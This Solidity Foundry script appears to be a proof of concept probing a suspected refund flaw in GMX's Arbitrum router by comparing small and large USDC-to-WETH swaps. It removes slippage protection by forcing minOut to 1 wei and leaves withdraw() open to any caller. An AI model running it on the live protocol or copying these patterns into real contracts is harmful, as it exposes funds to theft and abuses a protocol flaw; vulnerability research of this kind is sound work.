// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IGMXRouter {
    function swap(
        address[] memory _path,
        uint256 _amountIn,
        uint256 _minOut,
        address _receiver
    ) external returns (uint256);
}

contract GMXRefundDetector {
    address public router;
    address public usdc;
    address public weth;

    event SwapExecuted(uint256 amountIn, uint256 actualSpent, uint256 received);
    event RefundDetected(uint256 refundAmount);

    constructor(address _router, address _usdc, address _weth) {
        router = _router;
        usdc = _usdc;
        weth = _weth;
    }

    receive() external payable {}

    // Check current token balances
    function checkBalances() external view returns (uint256, uint256) {
        uint256 usdcBalance = IERC20(usdc).balanceOf(address(this));
        uint256 wethBalance = IERC20(weth).balanceOf(address(this));

        console.log("USDC Balance: %s", usdcBalance / 10**6);
        console.log("WETH Balance: %s ETH", wethBalance / 10**18);

        return (usdcBalance, wethBalance);
    }

    // Executes a swap and logs the outcome.
    // For testing, we force minOut = 1 to bypass the router’s strict output requirement.
    function doSwap(uint256 amount) external returns (uint256, uint256) {
        console.log("==== EXECUTING SWAP OF %s USDC ====", amount / 10**6);

        uint256 usdcBefore = IERC20(usdc).balanceOf(address(this));
        uint256 wethBefore = IERC20(weth).balanceOf(address(this));

        console.log("USDC before: %s", usdcBefore / 10**6);
        console.log("WETH before: %s ETH", wethBefore / 10**18);

        // Approve the router to spend USDC
        IERC20(usdc).approve(router, amount);

        // Set up swap path: USDC -> WETH
        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = weth;

        // For demonstration, force a very low minimum output (1 wei)
        uint256 minOut = 1;
        console.log("Min output forced to: %s (wei)", minOut);

        uint256 amountOut;
        try IGMXRouter(router).swap(path, amount, minOut, address(this)) returns (uint256 out) {
            amountOut = out;
            console.log("Router returned: %s WETH", out);
        } catch Error(string memory reason) {
            console.log("Swap failed: %s", reason);
            return (0, 0);
        } catch {
            console.log("Swap failed with unknown error");
            return (0, 0);
        }

        uint256 usdcAfter = IERC20(usdc).balanceOf(address(this));
        uint256 wethAfter = IERC20(weth).balanceOf(address(this));

        uint256 usdcSpent = usdcBefore - usdcAfter;
        uint256 wethReceived = wethAfter - wethBefore;

        console.log("USDC after: %s", usdcAfter / 10**6);
        console.log("WETH after: %s ETH", wethAfter / 10**18);
        console.log("USDC spent: %s", usdcSpent / 10**6);
        console.log("WETH received: %s WETH", wethReceived);

        if (usdcSpent < amount) {
            uint256 refundAmount = amount - usdcSpent;
            console.log("REFUND DETECTED: %s USDC", refundAmount / 10**6);
            emit RefundDetected(refundAmount);
        } else {
            console.log("No refund detected");
        }

        if (wethReceived > 0) {
            uint256 effectivePrice = (usdcSpent * 1e18) / wethReceived;
            console.log("Effective price: %s USDC per ETH", effectivePrice / 10**6);
        }

        emit SwapExecuted(amount, usdcSpent, wethReceived);
        return (usdcSpent, wethReceived);
    }

    // Test function comparing a small and a large swap to expose the vulnerability.
    function testRefundVulnerability(uint256 smallAmount, uint256 largeAmount) external {
        console.log("\n======= TESTING GMX REFUND VULNERABILITY =======\n");

        console.log("\n>> STEP 1: Small Swap");
        (uint256 smallUsdcSpent, uint256 smallWethReceived) = this.doSwap(smallAmount);
        if (smallWethReceived == 0) {
            console.log("Small swap failed - cannot continue test");
            return;
        }

        uint256 smallRate = (smallUsdcSpent * 1e18) / smallWethReceived;
        console.log("\nSmall swap rate: %s USDC per ETH", smallRate / 10**6);

        console.log("\n>> STEP 2: Large Swap");
        (uint256 largeUsdcSpent, uint256 largeWethReceived) = this.doSwap(largeAmount);
        if (largeWethReceived == 0) {
            console.log("Large swap failed - cannot complete test");
            return;
        }

        uint256 largeRate = (largeUsdcSpent * 1e18) / largeWethReceived;
        console.log("\nLarge swap rate: %s USDC per ETH", largeRate / 10**6);

        console.log("\n>> CONCLUSION:");
        if (largeUsdcSpent < largeAmount) {
            console.log("VULNERABILITY CONFIRMED!");
            console.log("Large swap was refunded %s USDC", (largeAmount - largeUsdcSpent) / 10**6);
            if (largeRate < smallRate) {
                uint256 improvement = ((smallRate - largeRate) * 100) / smallRate;
                console.log("Large swap got %s%% better rate than small swap", improvement);
                console.log("This confirms the double-benefit vulnerability");
            }
        } else {
            console.log("No refund detected with these amounts");
            console.log("Try with larger amounts to exceed the impact pool capacity");
        }
    }

    // Withdraw any remaining tokens from the contract.
    function withdraw() external {
        uint256 usdcBalance = IERC20(usdc).balanceOf(address(this));
        if (usdcBalance > 0) {
            IERC20(usdc).transfer(msg.sender, usdcBalance);
        }

        uint256 wethBalance = IERC20(weth).balanceOf(address(this));
        if (wethBalance > 0) {
            IERC20(weth).transfer(msg.sender, wethBalance);
        }

        console.log("All funds withdrawn");
    }
}

contract DeployGMXSwapAAA is Script {
    function run() external {
        // GMX contracts on Arbitrum
        address router = 0xaBBc5F99639c9B6bCb58544ddf04EFA6802F4064;
        address usdc = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
        address weth = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address sender = vm.addr(privateKey);
        console.log("Using address: %s", sender);

        // Check and fund USDC balance if needed.
        uint256 senderBalance = IERC20(usdc).balanceOf(sender);
        console.log("Current USDC balance: %s", senderBalance / 10**6);

        if (senderBalance == 0) {
            console.log("No USDC found, using simulation with test funding");
            address usdcWhale = 0x62383739D68Dd0F844103Db8dFb05a7EdED5BBE6;
            uint256 fundAmount = 10000 * 10**6; // 10,000 USDC

            vm.startPrank(usdcWhale);
            IERC20(usdc).transfer(sender, fundAmount);
            vm.stopPrank();

            senderBalance = IERC20(usdc).balanceOf(sender);
            console.log("Account funded with %s USDC", senderBalance / 10**6);
        }

        vm.startBroadcast();

        // Deploy the detector contract.
        GMXRefundDetector detector = new GMXRefundDetector(router, usdc, weth);
        console.log("GMXRefundDetector deployed at: %s", address(detector));

        // Transfer USDC from sender to detector.
        IERC20(usdc).transfer(address(detector), senderBalance);
        console.log("Transferred %s USDC to contract", senderBalance / 10**6);

        // Verify contract balances.
        detector.checkBalances();

        // Run vulnerability test using swap sizes based on available balance.
        if (senderBalance >= 10000 * 10**6) {
            detector.testRefundVulnerability(500 * 10**6, 8000 * 10**6);
        } else if (senderBalance >= 6000 * 10**6) {
            detector.testRefundVulnerability(500 * 10**6, 5000 * 10**6);
        } else {
            detector.testRefundVulnerability(100 * 10**6, 1000 * 10**6);
        }

        // Withdraw remaining funds.
        detector.withdraw();

        vm.stopBroadcast();
    }
}
